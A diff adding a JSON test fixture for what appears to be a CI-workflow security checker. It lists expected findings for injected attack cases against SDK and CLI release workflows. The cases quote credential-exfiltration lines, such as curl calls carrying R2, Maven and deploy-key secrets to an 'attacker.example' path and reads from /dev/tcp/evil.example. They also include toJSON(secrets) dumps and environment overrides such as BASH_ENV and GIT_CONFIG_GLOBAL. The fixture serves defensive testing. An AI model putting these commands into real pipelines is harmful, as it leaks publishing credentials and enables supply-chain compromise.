@@ -1,0 +1,611 @@
+{
+  "H1 maven: a proxy relay of MAVEN_R2_SECRET_ACCESS_KEY": [
+    "sdk-publish.yml: publish-maven step Upload: a credentialed job runs `curl -fsS --proto =https --tlsv1.2 \"https://proxy.golang.org/attacker.example/${MAVEN_R2_SECRET_ACCESS_KEY}/@v/list\"`: it reads the credential MAVEN_R2_SECRET_ACCESS_KEY outside its recorded position"
+  ],
+  "H2 cli upload: a proxy relay of R2_SECRET_ACCESS_KEY": [
+    "cli-release.yml: upload step Upload v<ver>/ to R2: a credentialed job runs `curl -fsS --proto =https --tlsv1.2 \"https://proxy.golang.org/attacker.example/${R2_SECRET_ACCESS_KEY}/@v/list\"`: it reads the credential R2_SECRET_ACCESS_KEY outside its recorded position"
+  ],
+  "H3 cli promote: a proxy relay of two keys": [
+    "cli-release.yml: promote step Promote: a credentialed job runs `curl -fsS \"https://proxy.golang.org/attacker.example/${R2_ACCESS_KEY_ID}/${R2_SECRET_ACCESS_KEY}/@v/list\"`: it reads the credential R2_ACCESS_KEY_ID outside its recorded position"
+  ],
+  "H5 maven: the secret printed into publish-tmp": [
+    "sdk-publish.yml: publish-maven step Upload: a credentialed job runs `printf '%s\\n' \"${MAVEN_R2_SECRET_ACCESS_KEY}\"`: it reads the credential MAVEN_R2_SECRET_ACCESS_KEY outside its recorded position"
+  ],
+  "N1 crates: the OIDC token printed into publish-tmp": [
+    "sdk-publish.yml: publish-crates step Upload: a credentialed job runs `printf '%s\\n' \"${CARGO_REGISTRY_TOKEN}\"`: it reads the credential CARGO_REGISTRY_TOKEN outside its recorded position"
+  ],
+  "go: a relay of the deploy key, though curl is the Go job's": [
+    "sdk-publish.yml: publish-go step Install the deploy key: a credentialed job runs `curl -fsS \"https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/${DEPLOY_KEY}\"`: it reads the credential DEPLOY_KEY outside its recorded position"
+  ],
+  "go: an expansion before /@v/": [
+    "sdk-publish.yml: publish-go step injected: a credentialed job runs `curl -fsS \"https://proxy.golang.org/${UNIT_VERSION}/x/@v/list\"`: curl reaches only https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/v${UNIT_VERSION}.info, exactly"
+  ],
+  "go: another module on the proxy": [
+    "sdk-publish.yml: publish-go step injected: a credentialed job runs `curl -fsS \"https://proxy.golang.org/attacker.example/x/@v/list\"`: curl reaches only https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/v${UNIT_VERSION}.info, exactly"
+  ],
+  "npm: curl outside the Go job": [
+    "sdk-publish.yml: publish-npm step injected: a credentialed job runs `curl -fsS \"https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/list\"`: curl is not a command environment sdk-publish-npm's job runs"
+  ],
+  "npm: git outside the git jobs": [
+    "sdk-publish.yml: publish-npm step injected: a credentialed job runs `git push git@github.com:confeature/sdks.git HEAD:refs/heads/x`: git is not a command environment sdk-publish-npm's job runs",
+    "sdk-publish.yml: publish-npm: step injected runs git without GIT_CONFIG_GLOBAL: /dev/null in its own env",
+    "sdk-publish.yml: publish-npm: step injected runs git without GIT_CONFIG_NOSYSTEM: 1 in its own env"
+  ],
+  "nuget: a credential that is not a deploy key, written as one": [
+    "sdk-publish.yml: publish-nuget step Upload: a credentialed job runs `printf '%s\\n' \"$NUGET_API_KEY\"`: it reads the credential NUGET_API_KEY outside its recorded position"
+  ],
+  "packagist: the deploy key written anywhere but its file": [
+    "sdk-publish.yml: publish-packagist step Install the deploy key: a credentialed job runs `printf '%s\\n' \"$DEPLOY_KEY\"`: it reads the credential DEPLOY_KEY outside its recorded position"
+  ],
+  "a credential through env.: a step env that copies one": [
+    "sdk-publish.yml: publish-nuget step Upload: a credentialed job runs `printf '%s\\n' \"$COPY\"`: it reads the credential COPY outside its recorded position",
+    "sdk-publish.yml: publish-nuget step Upload: env.NUGET_API_KEY: no env: in scope defines NUGET_API_KEY",
+    "sdk-publish.yml: publish-nuget: a credentialed job's env: it sets COPY, which CREDENTIALED_ENV does not allow"
+  ],
+  "a renamed setup output (the UNIT_PATH bug's other door)": [
+    "sdk-publish.yml: pack-crates step Check the artifact against the resolved unit, and dry-run the upload: needs.setup.outputs.path: job setup has no output path",
+    "sdk-publish.yml: pack-crates step Pack the release artifact: needs.setup.outputs.path: job setup has no output path",
+    "sdk-publish.yml: pack-crates: needs.setup.outputs.path: job setup has no output path",
+    "sdk-publish.yml: pack-go: needs.setup.outputs.path: job setup has no output path",
+    "sdk-publish.yml: pack-maven: needs.setup.outputs.path: job setup has no output path",
+    "sdk-publish.yml: pack-nuget: needs.setup.outputs.path: job setup has no output path",
+    "sdk-publish.yml: pack-packagist: needs.setup.outputs.path: job setup has no output path",
+    "sdk-publish.yml: pack-pubdev step Pack the release artifact: needs.setup.outputs.path: job setup has no output path",
+    "sdk-publish.yml: pack-pypi: needs.setup.outputs.path: job setup has no output path",
+    "sdk-publish.yml: pack-rubygems step Pack the release artifact: needs.setup.outputs.path: job setup has no output path",
+    "sdk-publish.yml: pack-rubygems: needs.setup.outputs.path: job setup has no output path",
+    "sdk-publish.yml: pack-swiftpm: needs.setup.outputs.path: job setup has no output path",
+    "sdk-publish.yml: publish-crates: needs.setup.outputs.path: job setup has no output path",
+    "sdk-publish.yml: publish-pubdev: needs.setup.outputs.path: job setup has no output path"
+  ],
+  "a need the job does not declare": [
+    "sdk-publish.yml: publish-crates: a credentialed job's env: UNIT_PATH is ${{ needs.pack-npm.outputs.file }}, not its pinned expression",
+    "sdk-publish.yml: publish-crates: needs.pack-npm.outputs.file: publish-crates does not need pack-npm"
+  ],
+  "a step output of a later step": [
+    "sdk-publish.yml: publish-crates step Checkout: steps.auth.outputs.token: no earlier step of publish-crates has id auth",
+    "sdk-publish.yml: publish-crates: action 1 is {\"uses\":\"actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\",\"with\":{\"fetch-depth\":1,\"persist-credentials\":false,\"x\":\"${{ steps.auth.outputs.token }}\"}}, ACTION_SURFACE records {\"uses\":\"actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\",\"with\":{\"fetch-depth\":1,\"persist-credentials\":false}}"
+  ],
+  "an env name nothing defines": [
+    "sdk-publish.yml: pack-npm step Setup Node.js: env.NODE_VER: no env: in scope defines NODE_VER",
+    "sdk-publish.yml: pack-npm step Setup Node.js: setup-node's node-version is ${{ env.NODE_VER }}, not the workflow's exact NODE_VERSION"
+  ],
+  "an input the workflow does not declare": [
+    "sdk-publish.yml: setup step Resolve the publish unit (tools/sdk-pack/resolve-publish.mjs): inputs.unitName: the workflow declares no input unitName"
+  ],
+  "a job if: on an undeclared need": [
+    "sdk-publish.yml: publish-npm: a credentialed job's if: does not require a tag push (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/'), top-level conjuncts, no || or !)",
+    "sdk-publish.yml: publish-npm: needs.pack-pypi.result: publish-npm does not need pack-pypi"
+  ],
+  "cli-release: an output the release job does not declare": [
+    "cli-release.yml: upload step Check the build against the release job's digest: needs.release.outputs.digest: job release has no output digest",
+    "cli-release.yml: upload: a credentialed job's env: EXPECTED is ${{ needs.release.outputs.digest }}, not its pinned expression"
+  ],
+  "N2 a step-level UNIT_PATH on the cargo step": [
+    "sdk-publish.yml: publish-crates: a credentialed job's env: UNIT_PATH is publish-tmp/evil, not its pinned expression",
+    "sdk-publish.yml: publish-crates: a credentialed job's step Upload redefines the job's UNIT_PATH"
+  ],
+  "N2b a literal job-level UNIT_PATH": [
+    "sdk-publish.yml: publish-crates: a credentialed job's env: UNIT_PATH is publish-tmp/evil, not its pinned expression"
+  ],
+  "H4 UNIT_PATH to publish-tmp plus the token in a forged crate": [
+    "sdk-publish.yml: publish-crates step Upload: a credentialed job runs `printf '%s\\n' \"${CARGO_REGISTRY_TOKEN}\"`: it reads the credential CARGO_REGISTRY_TOKEN outside its recorded position",
+    "sdk-publish.yml: publish-crates: a credentialed job's env: UNIT_PATH is publish-tmp/evil, not its pinned expression",
+    "sdk-publish.yml: publish-crates: a credentialed job's step Upload redefines the job's UNIT_PATH"
+  ],
+  "T1 cli upload: a step-level TAG": [
+    "cli-release.yml: upload: a credentialed job's env: TAG is cli-v0.0.1, not its pinned expression"
+  ],
+  "T2 cli upload: a job-level TAG": [
+    "cli-release.yml: upload: a credentialed job's env: TAG is cli-v0.0.1, not its pinned expression",
+    "cli-release.yml: upload: a credentialed job's step Upload v<ver>/ to R2 redefines the job's TAG"
+  ],
+  "N10 a TAG from the event's commit message": [
+    "cli-release.yml: upload: a credentialed job's env: TAG is ${{ github.event.head_commit.message }}, not its pinned expression"
+  ],
+  "a step that redefines its job's value with the same expression": [
+    "sdk-publish.yml: publish-crates: a credentialed job's step Upload redefines the job's UNIT_PATH"
+  ],
+  "an artifact name from another output": [
+    "sdk-publish.yml: publish-npm: a credentialed job's env: ARTIFACT is ${{ needs.pack-npm.outputs.sha256 }}, not its pinned expression"
+  ],
+  "publish-go sets GIT_CONFIG_GLOBAL at job level, which checkout inherits": [
+    "sdk-publish.yml: publish-go: GIT_CONFIG_GLOBAL is set in the job's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: publish-go: a credentialed job's step Upload redefines the job's GIT_CONFIG_GLOBAL"
+  ],
+  "the workflow env sets GIT_CONFIG_NOSYSTEM": [
+    "sdk-publish.yml: gate: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-crates: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-go: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-maven: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-npm: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-nuget: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-packagist: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-pubdev: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-pypi: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-rubygems: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-swiftpm: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: publish-crates: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: publish-go step Upload: env GIT_CONFIG_NOSYSTEM redefines the workflow's GIT_CONFIG_NOSYSTEM",
+    "sdk-publish.yml: publish-go: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: publish-maven: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: publish-packagist step Check the artifact against the pack job's digest and split: env GIT_CONFIG_NOSYSTEM redefines the workflow's GIT_CONFIG_NOSYSTEM",
+    "sdk-publish.yml: publish-packagist step Upload: env GIT_CONFIG_NOSYSTEM redefines the workflow's GIT_CONFIG_NOSYSTEM",
+    "sdk-publish.yml: publish-pubdev: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: publish-swiftpm step Check the artifact against the pack job's digest and split: env GIT_CONFIG_NOSYSTEM redefines the workflow's GIT_CONFIG_NOSYSTEM",
+    "sdk-publish.yml: publish-swiftpm step Upload: env GIT_CONFIG_NOSYSTEM redefines the workflow's GIT_CONFIG_NOSYSTEM",
+    "sdk-publish.yml: setup: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: workflow-rules: GIT_CONFIG_NOSYSTEM is set in the workflow's env, which actions/checkout inherits (set it on the git steps)"
+  ],
+  "a mirror's git step without the isolation": [
+    "sdk-publish.yml: publish-packagist: step Upload runs git without GIT_CONFIG_GLOBAL: /dev/null in its own env"
+  ],
+  "the Go push with GIT_CONFIG_NOSYSTEM off": [
+    "sdk-publish.yml: publish-go: a credentialed job's env: GIT_CONFIG_NOSYSTEM is 0, not its pinned expression",
+    "sdk-publish.yml: publish-go: a credentialed job's env: it sets GIT_CONFIG_NOSYSTEM, which points every tool at another configuration",
+    "sdk-publish.yml: publish-go: step Upload runs git without GIT_CONFIG_NOSYSTEM: 1 in its own env"
+  ],
+  "P1 printf '-v' X y": [
+    "sdk-publish.yml: publish-maven step injected: a credentialed job runs `printf '-v' X y`: printf takes no option, and its format is one of '%s\\n', '%s  %s\\n'"
+  ],
+  "P2 printf '-vHOME' x": [
+    "sdk-publish.yml: publish-maven step injected: a credentialed job runs `printf '-vHOME' x`: printf takes no option, and its format is one of '%s\\n', '%s  %s\\n'"
+  ],
+  "P3 printf \"-v\" X y": [
+    "sdk-publish.yml: publish-maven step injected: a credentialed job runs `printf \"-v\" X y`: printf takes no option, and its format is one of '%s\\n', '%s  %s\\n'"
+  ],
+  "P3b printf -v'' X y": [
+    "sdk-publish.yml: publish-maven step injected: a credentialed job runs `printf -v'' X y`: printf takes no option, and its format is one of '%s\\n', '%s  %s\\n'"
+  ],
+  "M1 job env NPM_VERSION npm:evil": [
+    "sdk-publish.yml: publish-npm: a credentialed job's env: NPM_VERSION is npm:evil@1.0.0, not its pinned expression",
+    "sdk-publish.yml: publish-npm: env NPM_VERSION is npm:evil@1.0.0, not an exact version",
+    "sdk-publish.yml: publish-npm: env NPM_VERSION redefines the workflow's NPM_VERSION"
+  ],
+  "M2 step env RUST_VERSION": [
+    "sdk-publish.yml: publish-crates step injected: a credentialed job runs `echo x`: echo is not a command environment sdk-publish-crates's job runs",
+    "sdk-publish.yml: publish-crates step injected: env RUST_VERSION is nightly, not an exact version",
+    "sdk-publish.yml: publish-crates step injected: env RUST_VERSION redefines the workflow's RUST_VERSION",
+    "sdk-publish.yml: publish-crates: a credentialed job's env: RUST_VERSION is nightly, not its pinned expression"
+  ],
+  "M3 step env TAG": [
+    "sdk-publish.yml: publish-crates step injected: a credentialed job runs `echo x`: echo is not a command environment sdk-publish-crates's job runs",
+    "sdk-publish.yml: publish-crates: a credentialed job's env: TAG is evil, not its pinned expression"
+  ],
+  "M4 job env MAVEN_URL": [
+    "sdk-publish.yml: publish-maven: a credentialed job's env: MAVEN_URL is https://evil.example, not its pinned expression",
+    "sdk-publish.yml: publish-maven: env MAVEN_URL redefines the workflow's MAVEN_URL"
+  ],
+  "L1 sort < /dev/tcp": [
+    "sdk-publish.yml: publish-maven step injected: a credentialed job runs `sort`: a credentialed job reads input only from publish-tmp/ or a path this job downloads to (/dev/tcp/evil.example/80)"
+  ],
+  "N3 GIT_CONFIG_GLOBAL=publish-tmp/gc": [
+    "sdk-publish.yml: publish-maven: a credentialed job's env: GIT_CONFIG_GLOBAL is publish-tmp/gc, not its pinned expression",
+    "sdk-publish.yml: publish-maven: a credentialed job's env: it sets GIT_CONFIG_GLOBAL, which points every tool at another configuration"
+  ],
+  "N3c GIT_CONFIG_COUNT": [
+    "sdk-publish.yml: publish-maven: a credentialed job's env: it sets GIT_CONFIG_COUNT, which CREDENTIALED_ENV does not allow"
+  ],
+  "N3d workflow env BASH_ENV": [
+    "sdk-publish.yml: publish-crates: a credentialed job's env: it sets BASH_ENV, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-go: a credentialed job's env: it sets BASH_ENV, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-maven: a credentialed job's env: it sets BASH_ENV, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-npm: a credentialed job's env: it sets BASH_ENV, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-nuget: a credentialed job's env: it sets BASH_ENV, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-packagist: a credentialed job's env: it sets BASH_ENV, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-pubdev: a credentialed job's env: it sets BASH_ENV, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-pypi: a credentialed job's env: it sets BASH_ENV, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-rubygems: a credentialed job's env: it sets BASH_ENV, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-swiftpm: a credentialed job's env: it sets BASH_ENV, which CREDENTIALED_ENV does not allow"
+  ],
+  "N3e workflow env GIT_CONFIG_GLOBAL": [
+    "sdk-publish.yml: gate: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-crates: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-go: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-maven: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-npm: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-nuget: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-packagist: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-pubdev: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-pypi: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-rubygems: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: pack-swiftpm: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: publish-crates: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: publish-crates: a credentialed job's env: GIT_CONFIG_GLOBAL is publish-tmp/gc, not its pinned expression",
+    "sdk-publish.yml: publish-crates: a credentialed job's env: it sets GIT_CONFIG_GLOBAL, which points every tool at another configuration",
+    "sdk-publish.yml: publish-go step Upload: env GIT_CONFIG_GLOBAL redefines the workflow's GIT_CONFIG_GLOBAL",
+    "sdk-publish.yml: publish-go: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: publish-go: a credentialed job's env: GIT_CONFIG_GLOBAL is publish-tmp/gc, not its pinned expression",
+    "sdk-publish.yml: publish-go: a credentialed job's env: it sets GIT_CONFIG_GLOBAL, which points every tool at another configuration",
+    "sdk-publish.yml: publish-maven: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: publish-maven: a credentialed job's env: GIT_CONFIG_GLOBAL is publish-tmp/gc, not its pinned expression",
+    "sdk-publish.yml: publish-maven: a credentialed job's env: it sets GIT_CONFIG_GLOBAL, which points every tool at another configuration",
+    "sdk-publish.yml: publish-npm: a credentialed job's env: GIT_CONFIG_GLOBAL is publish-tmp/gc, not its pinned expression",
+    "sdk-publish.yml: publish-npm: a credentialed job's env: it sets GIT_CONFIG_GLOBAL, which points every tool at another configuration",
+    "sdk-publish.yml: publish-nuget: a credentialed job's env: GIT_CONFIG_GLOBAL is publish-tmp/gc, not its pinned expression",
+    "sdk-publish.yml: publish-nuget: a credentialed job's env: it sets GIT_CONFIG_GLOBAL, which points every tool at another configuration",
+    "sdk-publish.yml: publish-packagist step Check the artifact against the pack job's digest and split: env GIT_CONFIG_GLOBAL redefines the workflow's GIT_CONFIG_GLOBAL",
+    "sdk-publish.yml: publish-packagist step Upload: env GIT_CONFIG_GLOBAL redefines the workflow's GIT_CONFIG_GLOBAL",
+    "sdk-publish.yml: publish-packagist: a credentialed job's env: GIT_CONFIG_GLOBAL is publish-tmp/gc, not its pinned expression",
+    "sdk-publish.yml: publish-packagist: a credentialed job's env: it sets GIT_CONFIG_GLOBAL, which points every tool at another configuration",
+    "sdk-publish.yml: publish-pubdev: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: publish-pubdev: a credentialed job's env: GIT_CONFIG_GLOBAL is publish-tmp/gc, not its pinned expression",
+    "sdk-publish.yml: publish-pubdev: a credentialed job's env: it sets GIT_CONFIG_GLOBAL, which points every tool at another configuration",
+    "sdk-publish.yml: publish-pypi: a credentialed job's env: GIT_CONFIG_GLOBAL is publish-tmp/gc, not its pinned expression",
+    "sdk-publish.yml: publish-pypi: a credentialed job's env: it sets GIT_CONFIG_GLOBAL, which points every tool at another configuration",
+    "sdk-publish.yml: publish-rubygems: a credentialed job's env: GIT_CONFIG_GLOBAL is publish-tmp/gc, not its pinned expression",
+    "sdk-publish.yml: publish-rubygems: a credentialed job's env: it sets GIT_CONFIG_GLOBAL, which points every tool at another configuration",
+    "sdk-publish.yml: publish-swiftpm step Check the artifact against the pack job's digest and split: env GIT_CONFIG_GLOBAL redefines the workflow's GIT_CONFIG_GLOBAL",
+    "sdk-publish.yml: publish-swiftpm step Upload: env GIT_CONFIG_GLOBAL redefines the workflow's GIT_CONFIG_GLOBAL",
+    "sdk-publish.yml: publish-swiftpm: a credentialed job's env: GIT_CONFIG_GLOBAL is publish-tmp/gc, not its pinned expression",
+    "sdk-publish.yml: publish-swiftpm: a credentialed job's env: it sets GIT_CONFIG_GLOBAL, which points every tool at another configuration",
+    "sdk-publish.yml: setup: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)",
+    "sdk-publish.yml: workflow-rules: GIT_CONFIG_GLOBAL is set in the workflow's env, which actions/checkout inherits (set it on the git steps)"
+  ],
+  "N3f workflow env CURL_HOME": [
+    "sdk-publish.yml: publish-crates: a credentialed job's env: it sets CURL_HOME, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-go: a credentialed job's env: it sets CURL_HOME, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-maven: a credentialed job's env: it sets CURL_HOME, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-npm: a credentialed job's env: it sets CURL_HOME, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-nuget: a credentialed job's env: it sets CURL_HOME, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-packagist: a credentialed job's env: it sets CURL_HOME, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-pubdev: a credentialed job's env: it sets CURL_HOME, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-pypi: a credentialed job's env: it sets CURL_HOME, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-rubygems: a credentialed job's env: it sets CURL_HOME, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-swiftpm: a credentialed job's env: it sets CURL_HOME, which CREDENTIALED_ENV does not allow"
+  ],
+  "N3g step env HOME": [
+    "sdk-publish.yml: publish-maven: a credentialed job's env: it sets HOME, which points every tool at another configuration"
+  ],
+  "N4 sort < \"${TAG:-/dev/tcp/h/80}\"": [
+    "sdk-publish.yml: publish-maven step injected: a credentialed job runs `sort`: a redirection target must be a literal path (\"${TAG:-/dev/tcp/h/80}\")",
+    "sdk-publish.yml: publish-maven step injected: reads $TAG, which no env: of its step, job or workflow defines"
+  ],
+  "N4b curl with an operator expansion": [
+    "sdk-publish.yml: publish-go step injected: a credentialed job runs `curl -fsS --proto =https \"https://proxy.golang.org/${TAG:-x}\"`: an operator expansion (${NAME…}) is allowed only in a recorded exception",
+    "sdk-publish.yml: publish-go step injected: reads $TAG, which no env: of its step, job or workflow defines"
+  ],
+  "N4c echo \"${TAG:-x}\"": [
+    "sdk-publish.yml: publish-maven step injected: a credentialed job runs `echo \"${TAG:-x}\"`: an operator expansion (${NAME…}) is allowed only in a recorded exception",
+    "sdk-publish.yml: publish-maven step injected: reads $TAG, which no env: of its step, job or workflow defines"
+  ],
+  "N5 sha256sum < release/x where the job downloads to dist/": [
+    "cli-release.yml: upload step injected: a credentialed job runs `sha256sum --check --strict`: a credentialed job reads input only from publish-tmp/ or a path this job downloads to (release/x)"
+  ],
+  "N5b sort < dist/x where the job downloads to release/": [
+    "sdk-publish.yml: publish-maven step injected: a credentialed job runs `sort`: a credentialed job reads input only from publish-tmp/ or a path this job downloads to (dist/x)"
+  ],
+  "N6 npm publishing a forged package.json from publish-tmp": [
+    "sdk-publish.yml: publish-npm step injected: a credentialed job runs `npm publish --access public --provenance --ignore-scripts ./publish-tmp/p`: npm publish uploads only ./release/${ARTIFACT}"
+  ],
+  "N7 git push from the npm job": [
+    "sdk-publish.yml: publish-npm step injected: a credentialed job runs `git push git@github.com:confeature/sdks.git HEAD:refs/heads/x`: git is not a command environment sdk-publish-npm's job runs",
+    "sdk-publish.yml: publish-npm: step injected runs git without GIT_CONFIG_GLOBAL: /dev/null in its own env",
+    "sdk-publish.yml: publish-npm: step injected runs git without GIT_CONFIG_NOSYSTEM: 1 in its own env"
+  ],
+  "N8 a quoted 'if'": [
+    "sdk-publish.yml: publish-maven step injected: a credentialed job runs `'if' echo x`: if is not a command a credentialed job runs"
+  ],
+  "N9 a comment that assigns": [
+    "sdk-publish.yml: pack-crates step injected: reads $FOO, which no env: of its step, job or workflow defines"
+  ],
+  "gem pushing another file": [
+    "sdk-publish.yml: publish-rubygems step injected: a credentialed job runs `gem push \"./release/x.gem\"`: gem push uploads only ./release/${ARTIFACT}"
+  ],
+  "dotnet pushing another file": [
+    "sdk-publish.yml: publish-nuget step injected: a credentialed job runs `dotnet nuget push \"./release/x.nupkg\" --source https://api.nuget.org/v3/index.json`: dotnet nuget push uploads only ./release/${UNIT_COORDINATES}.${UNIT_VERSION}.nupkg"
+  ],
+  "E1 [ -n K -a -n K ]": [
+    "sdk-publish.yml: publish-go step Install the deploy key: a credentialed job runs `[ -n \"$DEPLOY_KEY\" -a -n \"$DEPLOY_KEY\" ]`: it reads the credential DEPLOY_KEY outside its recorded position"
+  ],
+  "E2 [ -n K = abc ]": [
+    "sdk-publish.yml: publish-go step Install the deploy key: a credentialed job runs `if [ -n \"$DEPLOY_KEY\" = abc ]`: it reads the credential DEPLOY_KEY outside its recorded position"
+  ],
+  "E3 [ abc \\< -n -o -n K ]": [
+    "sdk-publish.yml: publish-go step Install the deploy key: a credentialed job's run: block has a backslash outside quotes"
+  ],
+  "E4 [ K ]": [
+    "sdk-publish.yml: publish-go step Install the deploy key: a credentialed job runs `[ \"$DEPLOY_KEY\" ]`: it reads the credential DEPLOY_KEY outside its recorded position"
+  ],
+  "L10 [ -n K -a … ] in Upload": [
+    "sdk-publish.yml: publish-go step Upload: reads $DEPLOY_KEY, which no env: of its step, job or workflow defines"
+  ],
+  "L1 secrets['X'] in an allowed name": [
+    "sdk-publish.yml: publish-go step injected: secrets['GO_TAG_DEPLOY_KEY']: an index ([…]) into a context",
+    "sdk-publish.yml: publish-go: a credentialed job's env: DOTNET_NOLOGO is ${{ secrets['GO_TAG_DEPLOY_KEY'] }}, not its pinned expression"
+  ],
+  "L2 toJSON(secrets)": [
+    "sdk-publish.yml: publish-go step injected: toJSON(secrets): toJSON, fromJSON, format and join are refused",
+    "sdk-publish.yml: publish-go: a credentialed job's env: DOTNET_NOLOGO is ${{ toJSON(secrets) }}, not its pinned expression"
+  ],
+  "L3 github['token']": [
+    "sdk-publish.yml: publish-go step injected: github['token']: an index ([…]) into a context",
+    "sdk-publish.yml: publish-go: a credentialed job's env: DOTNET_NOLOGO is ${{ github['token'] }}, not its pinned expression"
+  ],
+  "L3b toJSON(github)": [
+    "sdk-publish.yml: publish-go step injected: toJSON(github): toJSON, fromJSON, format and join are refused",
+    "sdk-publish.yml: publish-go: a credentialed job's env: DOTNET_NOLOGO is ${{ toJSON(github) }}, not its pinned expression"
+  ],
+  "L8 format('{0}', secrets.X)": [
+    "sdk-publish.yml: publish-go step injected: format('{0}', secrets.GO_TAG_DEPLOY_KEY): toJSON, fromJSON, format and join are refused",
+    "sdk-publish.yml: publish-go: a credentialed job's env: CLOUDFLARE_ACCOUNT_ID is ${{ format('{0}', secrets.GO_TAG_DEPLOY_KEY) }}, not its pinned expression"
+  ],
+  "L9 a job env bracket": [
+    "sdk-publish.yml: publish-go: a credentialed job's env: DOTNET_NOLOGO is ${{ secrets['GO_TAG_DEPLOY_KEY'] }}, not its pinned expression",
+    "sdk-publish.yml: publish-go: secrets['GO_TAG_DEPLOY_KEY']: an index ([…]) into a context"
+  ],
+  "M1 toJSON(secrets) as R2_ACCESS_KEY_ID": [
+    "sdk-publish.yml: publish-go: a credentialed job's env: R2_ACCESS_KEY_ID is ${{ toJSON(secrets) }}, not its pinned expression",
+    "sdk-publish.yml: publish-go: the credential R2_ACCESS_KEY_ID is set in the job's env; only the env: of the step that reads it may set it",
+    "sdk-publish.yml: publish-go: toJSON(secrets): toJSON, fromJSON, format and join are refused"
+  ],
